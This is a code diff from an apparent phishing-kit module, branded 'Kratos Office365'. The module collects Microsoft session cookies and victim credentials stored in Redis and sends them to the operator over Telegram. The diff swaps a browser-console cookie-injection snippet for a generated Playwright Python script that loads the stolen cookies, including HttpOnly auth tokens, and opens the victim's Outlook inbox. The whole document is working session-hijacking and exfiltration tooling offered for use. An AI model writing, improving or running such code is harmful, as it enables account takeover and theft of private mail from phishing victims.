@@ -105,7 +105,6 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     await necrohelp.Sleep(3000)
 
     // 2. Collect combined cookie set from ALL Microsoft domains
-    //    (muraena pre-auth cookies + any tokens MSAL issued during fixSession)
     const MS_DOMAINS = [
         'https://login.microsoftonline.com',
         'https://login.live.com',
@@ -139,7 +138,6 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 const credKeys = await rc1.keys(`victim:${victimUUID}:creds:*`)
                 for (const k of credKeys) {
                     const cred = await rc1.hGetAll(k)
-                    // Redis stores: { key: 'Username', val: 'user@domain.com', time: '...' }
                     const kl = (cred.key || '').toLowerCase()
                     if (['loginfmt', 'username', 'email', 'login'].includes(kl)) {
                         victimEmail = cred.val
@@ -155,7 +153,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     console.log(`[${taskId}] label=${label}  finalUrl=${finalUrl.substring(0,80)}`)
 
     if (params.telegramToken && params.telegramChatId) {
-        // 4. SETNX dedup — one delivery per victim email address per 24 h
+        // 4. SETNX dedup — one delivery per victim email per 24 h
         let alreadySent = false
         if (victimEmail) {
             try {
@@ -183,32 +181,57 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                     Expires: c.expires || 0
                 }))
 
-                // Base64 encode the JSON — avoids all backslash/quote escaping bugs
-                // that corrupted cookie values with the old JSON.parse('...') approach
+                // Base64 encode the JSON payload
                 const b64 = Buffer.from(JSON.stringify(cookieArr)).toString('base64')
 
-                // Injection script: paste in DevTools console on login.microsoftonline.com
-                // MSAL will then do a fresh silent auth and open OWA inbox directly
+                // Deliver as a Playwright Python script — context.add_cookies() sets
+                // cookies at the CDP level, so HttpOnly (ESTSAUTHPERSISTENT) is correctly
+                // set. Run: pip install playwright && playwright install chromium && python3 <file>
                 const script = [
-                    '// KRATOS OFFICE365 — paste in DevTools console on https://login.microsoftonline.com',
-                    '(function(){',
-                    '  var c=JSON.parse(atob("' + b64 + '"));',
-                    '  var exp=new Date(Date.now()+63072000000).toUTCString();',
-                    '  c.forEach(function(k){',
-                    '    var s=k.Name+"="+k.Value+";domain="+k.Domain+";path="+k.Path+";expires="+exp+";SameSite=None";',
-                    '    if(k.Secure)s+=";Secure";',
-                    '    try{document.cookie=s}catch(e){}',
-                    '  });',
-                    '  setTimeout(function(){window.location.href="https://outlook.office.com/mail/"},500);',
-                    '})();'
+                    '#!/usr/bin/env python3',
+                    '# KRATOS OFFICE365',
+                    '# pip install playwright && playwright install chromium',
+                    '# python3 ' + label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '') + '.py',
+                    'import asyncio, json, base64',
+                    'from playwright.async_api import async_playwright',
+                    '',
+                    'COOKIES_B64 = "' + b64 + '"',
+                    '',
+                    'async def main():',
+                    '    async with async_playwright() as p:',
+                    '        browser = await p.chromium.launch(headless=False)',
+                    '        context = await browser.new_context()',
+                    '        raw = json.loads(base64.b64decode(COOKIES_B64))',
+                    '        cookies = []',
+                    '        for c in raw:',
+                    '            ck = {',
+                    '                "name": c["Name"], "value": c["Value"],',
+                    '                "domain": c["Domain"], "path": c.get("Path", "/"),',
+                    '                "secure": c.get("Secure", False),',
+                    '                "http_only": c.get("HttpOnly", False),',
+                    '                "same_site": c.get("SameSite", "None"),',
+                    '            }',
+                    '            if c.get("Expires", 0) > 0:',
+                    '                ck["expires"] = float(c["Expires"])',
+                    '            cookies.append(ck)',
+                    '        await context.add_cookies(cookies)',
+                    '        page = await context.new_page()',
+                    '        await page.goto("https://outlook.office.com/mail/", wait_until="domcontentloaded")',
+                    '        await page.wait_for_timeout(5000)',
+                    '        await page.screenshot(path="inbox.png")',
+                    '        print("URL:", page.url)',
+                    '        input("Press Enter to close...")',
+                    '        await browser.close()',
+                    '',
+                    'asyncio.run(main())'
                 ].join('\n')
 
                 const caption = `[Kratos]- OFFICE VALID [ ${label} ] ❤️`
                 const safeLabel = label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '')
-                const filename = `${safeLabel}.txt`
+                const filename = `${safeLabel}.py`
 
                 for (const chatId of chatIds) {
-                    await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/plain' })
+                    await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/x-python' })
                     console.log(`[${taskId}] sent ${allCookies.length} cookies to Telegram ${chatId} as ${filename}`)
                 }
             } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
